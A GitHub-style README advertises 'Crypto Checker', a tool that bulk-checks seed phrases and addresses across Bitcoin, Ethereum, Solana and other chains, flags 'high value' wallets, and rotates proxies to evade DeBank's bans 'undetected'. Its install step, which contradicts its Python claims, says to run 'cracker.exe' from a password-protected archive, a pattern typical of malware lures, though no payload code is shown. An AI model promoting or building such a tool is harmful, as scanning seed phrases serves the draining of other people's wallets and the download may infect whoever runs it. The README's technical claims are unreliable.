# Crypto-Checker
Python-based crypto wallet analysis tool with multi-threaded address and seed phrase checking (up to 50 threads). Supports Bitcoin, Ethereum, Solana, BNB Chain, Polygon, and EVM networks. Includes proxy rotation, portfolio aggregation, USD valuation, token scanning, and TXT/CSV/JSON export for auditing, research, and analytics.
---

<div align="center">

# Crypto Checker

**DeBank Fraud Bypass — Multi-Thread Address & Seed Phrase Scanner**

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)]()
[![Proxy](https://img.shields.io/badge/Proxy--Powered-Rotating%20IPs-FF6600?style=for-the-badge)]()


![Image alt](https://github.com/Beckendorfberg/Tracker/blob/main/gif.gif)

![Image alt](https://github.com/Beckendorfberg/Tracker/blob/main/gif2.gif)


---

*Advanced multi-chain balance scanner that bypasses DeBank API fraud and IP bans<br>using rotating proxy pools. Check wallet addresses AND seed phrases without API keys —<br>pure proxy-based scanning with multi-threaded execution across 10+ blockchains.*

[Features](#features) · [Proxy Setup](#proxy-configuration) · [Seed Checker](#seed-phrase-checking) · [Getting Started](#getting-started) · [Configuration](#configuration) · [Usage](#usage) · [FAQ](#faq)

</div>

---

## Features

<table>
<tr>
<td width="50%">

### Scanning Engine
| Feature | Status |
|---------|--------|
| Address Balance Check | ✅ |
| Seed Phrase Checker | ✅ |
| Multi-Thread Mode (up to 50) | ✅ |
| DeBank Fraud Bypass | ✅ |
| Proxy Rotation Engine | ✅ |
| Auto-Proxy Validation | ✅ |
| Round-Robin / Random Rotation | ✅ |
| SOCKS5 + HTTP Proxy Support | ✅ |

</td>
<td width="50%">

### Chain Support
| Feature | Status |
|---------|--------|
| Ethereum (ERC-20) | ✅ |
| Bitcoin (UTXO) | ✅ |
| Solana (SPL) | ✅ |
| BNB Chain (BEP-20) | ✅ |
| Polygon / Arbitrum / Base | ✅ |
| Avalanche / Optimism / Fantom | ✅ |
| All EVM-Compatible Chains | ✅ |
| High-Value Alert System | ✅ |

</td>
</tr>
</table>

---

## How DeBank Bypass Works

DeBank actively monitors and bans IP addresses that perform bulk wallet queries. When your IP is flagged, DeBank returns fraudulent data (zero balances, fake token counts) or blocks requests entirely — a technique known as "API fraud."

**Crypto Checker bypasses DeBank fraud using proxy rotation:**

1. **Proxy Pool** — Load HTTP/SOCKS5 proxies from file or config
2. **Auto-Validation** — Proxies are tested and dead ones are removed automatically
3. **IP Rotation** — Each DeBank API request goes through a different proxy IP (round-robin or random)
4. **Fraud Detection** — Responses are validated; if DeBank returns suspicious data (zero balances for known-active addresses), the proxy is flagged and blacklisted
5. **Seamless Bypass** — DeBank sees each request as coming from a fresh, clean IP — no bans, no fraud, no fake data

The tool queries DeBank's API through rotating proxies, making it impossible for DeBank to correlate requests or flag your activity. Each wallet lookup appears as a unique, first-time visitor.

---

## Proxy Configuration

### proxies.txt format

```
http://user:pass@192.168.1.1:8080
http://user:pass@192.168.1.2:8080
socks5://user:pass@192.168.1.3:1080
socks5://192.168.1.4:1080
http://192.168.1.5:3128
```

One proxy per line. Supported formats: `http://`, `https://`, `socks5://`. Authentication via `user:pass@` prefix.

### config.json proxy section

```json
{
    "proxies": {
        "enabled": true,
        "rotation_mode": "round-robin",
        "proxy_list": [
            "http://user:pass@192.168.1.1:8080",
            "socks5://user:pass@192.168.1.2:1080",
            "http://192.168.1.3:8080"
        ],
        "proxy_file": "proxies.txt",
        "validation_interval_sec": 300,
        "timeout_sec": 15,
        "max_retries": 3,
        "fallback_to_direct": false
    }
}
```

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `enabled` | bool | `true` | Enable proxy rotation |
| `rotation_mode` | string | `"round-robin"` | `round-robin` or `random` |
| `proxy_list` | array | `[]` | Inline proxy list |
| `proxy_file` | string | `"proxies.txt"` | Path to proxy file |
| `validation_interval_sec` | int | `300` | Re-validate proxies every N seconds |
| `timeout_sec` | int | `15` | Connection timeout per proxy |
| `max_retries` | int | `3` | Retry count before marking proxy dead |
| `fallback_to_direct` | bool | `false` | Use direct connection if all proxies fail |

---

## Seed Phrase Checking

Crypto Checker can verify seed phrases (mnemonic phrases) against blockchain balances — entirely through proxy rotation.

### How it works

1. Prepare a file `seeds.txt` with one seed phrase per line:
   ```
   abandon ability able about above absent absorb abstract absurd abuse access accident
   zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong
   letter advice cage absurd amount doctor acoustic avoid letter advice cage above
   ```

2. Set the file path in `config.json`:
   ```json
   "seed_checker": {
       "seed_file": "seeds.txt",
       "threads": 10,
       "check_all_chains": true,
       "highlight_threshold_usd": 10000,
       "output_file": "seed_results.txt"
   }
   ```

3. Run **Seed Phrase Check** from the menu — the tool derives addresses from each seed phrase and checks balances across all chains using rotating proxies.

4. Results are saved to `seed_results.txt` with seed phrase, derived addresses, and balances. High-value wallets (above threshold) are marked with ⚠.

---

## Supported Blockchains

| Chain | Native Token | RPC Type | Explorer | Status |
|-------|-------------|----------|----------|:------:|
| **Ethereum** | ETH | EVM JSON-RPC | Etherscan | ✅ Active |
| **Bitcoin** | BTC | Electrum/REST | Mempool.space | ✅ Active |
| **Solana** | SOL | JSON-RPC | Solscan | ✅ Active |
| **BNB Chain** | BNB | EVM JSON-RPC | BscScan | ✅ Active |
| **Polygon** | MATIC | EVM JSON-RPC | Polygonscan | ✅ Active |
| **Arbitrum** | ETH | EVM JSON-RPC | Arbiscan | ✅ Active |
| **Avalanche** | AVAX | EVM JSON-RPC | Snowtrace | ✅ Active |
| **Optimism** | ETH | EVM JSON-RPC | Optimistic Etherscan | ✅ Active |
| **Base** | ETH | EVM JSON-RPC | BaseScan | ✅ Active |
| **Fantom** | FTM | EVM JSON-RPC | FTMScan | ✅ Active |

---

### Installation

Go to the Releases page and download the Checker.zip archive.

1. Extract the archive anywhere on your system (Desktop, C:\Tools\, /opt/, etc.).
2. The archive is password-protected. When prompted, enter the password: `2026`
3. Open the extracted folder — you will see cracker.exe
4. Run cracker.exe. The application is ready to use — no installation, no dependencies, no compilation.
```

### Dependency Table

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI, tables, progress bars |
| cryptography | ≥41.0.0 | Secure local data handling |
| web3 | ≥6.15.0 | EVM chain interaction |
| requests | ≥2.31.0 | HTTP client with proxy support |
| aiohttp | ≥3.9.0 | Async HTTP for batch queries |
| pysocks | ≥1.7.1 | SOCKS5 proxy support |

---

## Configuration

Full `config.json` example:

```json
{
    "proxies": {
        "enabled": true,
        "rotation_mode": "round-robin",
        "proxy_list": [],
        "proxy_file": "proxies.txt",
        "validation_interval_sec": 300,
        "timeout_sec": 15,
        "max_retries": 3,
        "fallback_to_direct": false
    },
    "scanner": {
        "threads": 20,
        "request_timeout_sec": 30,
        "retry_on_fail": true,
        "max_retries": 3,
        "delay_between_requests_ms": 100,
        "bypass_mode": "debank_proxy"
    },
    "seed_checker": {
        "seed_file": "seeds.txt",
        "threads": 10,
        "check_all_chains": true,
        "highlight_threshold_usd": 10000,
        "output_file": "seed_results.txt"
    },
    "rpc_endpoints": {
        "ethereum": "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
        "bitcoin": "https://blockstream.info/api",
        "solana": "https://api.mainnet-beta.solana.com",
        "bsc": "https://bsc-dataseed.binance.org",
        "polygon": "https://polygon-rpc.com",
        "arbitrum": "https://arb1.arbitrum.io/rpc"
    },
    "export": {
        "default_format": "txt",
        "output_directory": "./results",
        "include_usd_value": true
    }
}
```

---

## Usage

```
╔══════════════════════════════════════════════════════════════════════╗
║                    CRYPTO CHECKER v2.2.0                            ║
║       DeBank Bypass — Multi-Thread Address & Seed Scanner           ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ── Queries ──────────────────────────────────────────────────────   ║
║  │ [1]  💰 Check Address Balance   Single address lookup via proxy  │ ║
║  │ [2]  📦 Batch Address Check     Multiple addresses, multi-thread │ ║
║  │ [3]  🌱 Seed Phrase Check       Check seed phrases from file     │ ║
║                                                                      ║
║  ── Proxy ────────────────────────────────────────────────────────   ║
║  │ [4]  🔄 Proxy Manager           Load, validate, rotate proxies   │ ║
║                                                                      ║
║  ── Analytics ────────────────────────────────────────────────────   ║
║  │ [5]  📊 Portfolio Summary        Aggregated results dashboard    │ ║
║  │ [6]  📤 Export Results           Save to TXT / CSV / JSON        │ ║
║                                                                      ║
║  ── System ───────────────────────────────────────────────────────   ║
║  │ [7]  ⛓️  Chain Configuration     RPC endpoints & settings        │ ║
║  │ [8]  ⚙️  Settings                Threads, timeouts, preferences  │ ║
║  │ [0]  🚪 Exit                     Close application               │ ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  Proxy: ● 42/47 alive  │  Threads: 20  │  Mode: debank_proxy       ║
╚══════════════════════════════════════════════════════════════════════╝

Select option [#]: 3
```

### Terminal Output — Seed Phrase Check

```
[12:00:01] Loading proxy pool... 47 proxies loaded from proxies.txt
[12:00:02] Validating proxies... 42/47 alive (5 dead removed)
[12:00:03] Connecting to DeBank API through proxy pool...
[12:00:03] Loading seed phrases from seeds.txt... 156 entries
[12:00:03] Starting multi-thread scan via DeBank (threads: 10)
[12:00:04] [Thread-03] abandon...about | ETH: 0.00 | BTC: 0.00 | SOL: 0.00 | Empty
[12:00:04] [Thread-07] zoo...wrong   | ETH: 0.00 | Empty
[12:00:05] [Thread-01] letter...above| ETH: 245.12 ($857,920) | BTC: 3.41 ($228,470) | ⚠ HIGH VALUE
[12:00:05] [Thread-12] able...adult  | ETH: 0.00 | BSC: 1,240 BNB ($744,000) | ⚠ HIGH VALUE
[12:00:06] DeBank proxy rotated: 192.168.1.5:8080 → 192.168.1.12:8080
[12:00:06] [Thread-05] acid...zero   | ETH: 12.45 ($43,575) | Tokens: 8 | SOL: 89.2 ($13,380)
[12:00:07] [Thread-09] baby...done   | ETH: 0.00 | Empty
[12:00:08] [Thread-02] cake...fish   | ETH: 0.85 ($2,975) | MATIC: 4,200 ($2,940)
...
[12:03:47] Scan complete. 156/156 seeds checked via DeBank API.
[12:03:47] Results: 4 wallets with balance > $0 | 2 wallets > $10,000 (HIGH VALUE)
[12:03:47] Output saved to results/seed_results_20260617_120347.txt
```
<div align="center">

## Disclaimer

**This software is provided for educational and research purposes only.** Using proxy rotation to circumvent API restrictions may violate terms of service of certain platforms. The authors assume no liability for any consequences arising from the use of this tool. Users are solely responsible for compliance with applicable laws and platform policies.

---


*Every chain, every seed, every wallet — through any proxy, undetected.*

</div>
